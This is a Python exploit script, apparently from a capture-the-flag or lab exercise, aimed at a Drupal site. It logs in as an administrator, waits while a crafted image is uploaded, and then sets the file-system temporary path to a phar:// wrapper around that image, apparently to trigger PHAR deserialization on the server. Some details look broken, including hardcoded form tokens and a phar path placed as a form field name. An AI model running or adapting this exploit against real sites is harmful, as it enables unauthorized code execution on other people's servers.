import requests
import os
import sys
import time

date=time.strftime("%Y-%m",time.localtime())


username=sys.argv[1]
password=sys.argv[2]
target=sys.argv[3]
port=sys.argv[4]

input("uploadok:")
s=requests.session()

headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": "zh,en-US;q=0.7,en;q=0.3","Accept-Encoding": "gzip, deflate","Referer": f"http://{target}:{port}/user/login","Upgrade-Insecure-Requests": "1"}
proxies ={"http":"http://127.0.0.1:8080"}

data={"name":username,"pass":password,"form_id":"user_login_form","op":"Log+in"}

res=s.post(url=f"http://{target}:{port}/user/login",headers=headers,data=data)
res=s.get(url=f"http://{target}:{port}/")




headers={"Referer": f"http://{target}:{port}/admin/config/media/file-system"}

data={"file_temporary_path":"phar://sites/default/files/pictures/2022-03/blog.jpg",f"phar://sites/default/files/pictures/{date}/blog.jpg":"public","temporary_maximum_age":"21600","form_build_id":"form-irUAkhC2DBHlefiUy2YwIoC2J8P7RanTBY8zAb0EcnA","form_token":"Vdo7xWRwxLyBtnrcbwPPQvSe6GV_CSHDxLAlqMEUtXs","form_id":"system_file_system_settings","op":"system_file_system_settings"}

res=s.post(url=f"http://{target}:{port}/admin/config/media/file-system",data=data,headers=headers)
end=(res.text).find("<!DOCTYPE html>")
print(res.text[:end])

